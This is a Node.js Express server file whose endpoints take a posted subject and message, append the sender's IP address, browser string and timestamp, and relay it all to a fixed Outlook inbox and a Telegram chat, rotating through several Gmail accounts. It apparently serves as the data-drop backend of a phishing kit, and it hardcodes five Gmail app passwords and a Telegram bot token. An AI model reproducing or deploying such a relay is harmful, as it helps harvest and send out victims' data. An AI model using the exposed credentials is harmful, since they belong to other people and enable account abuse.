const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const app = express();
const port = 3001;

// Middleware to parse JSON requests
app.use(cors());
app.use(bodyParser.json());

// CORS Headers for iOS compatibility
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Gmail accounts and their app passwords
const gmailAccounts = [
  { user: "serenetides01@gmail.com", pass: "fgta ophs ewdn gfum" },
  { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },
  { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
  { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
  { user: "richard.weeks1945@gmail.com", pass: "ukrt wbph qizo ticu" },
];

// Telegram Bot setup
const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c";
const telegramBot = new TelegramBot(telegramToken, { polling: true });
const chatId = "5640521477"; // Replace with your chat ID
const webhookUrl = "https://api-gamma-neon.vercel.app/telegram-webhook"; // Replace with your actual webhook URL

// Set Telegram webhook
const setWebhook = async () => {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${telegramToken}/setWebhook`,
      { url: webhookUrl }
    );
    console.log("Webhook set successfully:", response.data);
  } catch (error) {
    console.error("Error setting webhook:", error.message);
  }
};
setWebhook();

app.get("/", (req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Welcome to my simple API");
});

// Rotate email accounts and send emails
const sendEmailWithRotation = (req, subject, message, callback) => {
  let attempt = 0;

  const tryNextAccount = () => {
    if (attempt >= gmailAccounts.length) {
      console.log("All Gmail accounts have been tried, email sending failed.");
      return callback("Failed to send email", null);
    }

    const { user, pass } = gmailAccounts[attempt];
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: { user, pass },
    });

    const ipAddress = req.ip;
    const userAgent = req.headers["user-agent"];
    const timestamp = new Date().toISOString();

    const fullMessage = `*Message*\n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address*\n${ipAddress}\n\n*Browser*\n${userAgent}\n\n*Timestamp*\n${timestamp}\n\n_Good luck!_`;

    const mailOptions = {
      from: user,
      to: "hey.heatherw@outlook.com",
      subject: subject,
      text: fullMessage,
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(`Failed to send email with ${user}:`, error.message);
        attempt++;
        tryNextAccount();
      } else {
        console.log(`Email successfully sent using ${user}.`);
        telegramBot
          .sendMessage(chatId, `*Subject:* ${subject}\n\n${fullMessage}`, {
            parse_mode: "Markdown",
          })
          .then(() => callback(null, { message: "Success", info }))
          .catch((telegramError) => {
            console.error(
              "Failed to send Telegram message:",
              telegramError.message
            );
            callback("Telegram message failed", null);
          });
      }
    });
  };

  tryNextAccount();
};

app.post("/go", (req, res) => {
  const { subject, message } = req.body;

  if (!subject || !message) {
    console.error("Missing subject or message in request body.");
    return res.status(400).json({ error: "All fields are required" });
  }

  sendEmailWithRotation(req, subject, message, (error, result) => {
    if (error) {
      console.error("Error occurred:", error);
      return res.status(500).json({ error });
    }
    res.status(200).json(result);
  });
});

// New route: Sends email without Telegram integration but includes all additional info
app.post("/gowt", (req, res) => {
  const { subject, message } = req.body;

  // Validate request body
  if (!subject || !message) {
    console.log("Request validation failed. Missing subject or message."); // Diagnostic point
    return res.status(400).json({ error: "All fields are required" });
  }

  console.log("Received request to send email only."); // Diagnostic point

  let attempt = 0;

  const tryNextAccount = () => {
    if (attempt >= gmailAccounts.length) {
      console.log("All Gmail accounts have been tried, email sending failed.");
      return res.status(500).json({ error: "Failed to send email with all accounts" });
    }

    const { user, pass } = gmailAccounts[attempt];
    console.log(`Attempting to send email with: ${user}`); // Diagnostic point

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user,
        pass,
      },
    });

    // Collect additional information (IP address, browser, timestamp)
    const ipAddress = req.ip; // IP address of the user
    const userAgent = req.headers["user-agent"]; // Browser info
    const timestamp = new Date().toISOString(); // Current timestamp in ISO format

    // Prepare the full email body
    const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;

    // Prepare email options
    const mailOptions = {
      from: user, // Sender email
      to: "hey.heatherw@outlook.com", // Recipient email
      subject: subject, // Email subject
      text: fullMessage, // Email body
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(`Failed to send email with ${user}:`, error); // Diagnostic point
        attempt++; // Try the next account
        tryNextAccount();
      } else {
        console.log(`Email successfully sent using ${user}.`); // Diagnostic point
        res.status(200).json({ message: "Email sent successfully", info });
      }
    });
  };

  // Start trying to send the email with the first account
  tryNextAccount();
});


app.post("/telegram-webhook", (req, res) => {
  console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));

  if (req.body && req.body.message) {
    const chatId = req.body.message.chat.id;
    const text = req.body.message.text;

    console.log("Received message:", text);

    telegramBot
      .sendMessage(chatId, `You said: ${text}`)
      .then(() => console.log("Message sent successfully."))
      .catch((err) =>
        console.error("Failed to send Telegram message:", err.message)
      );
  }

  res.status(200).send("OK");
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
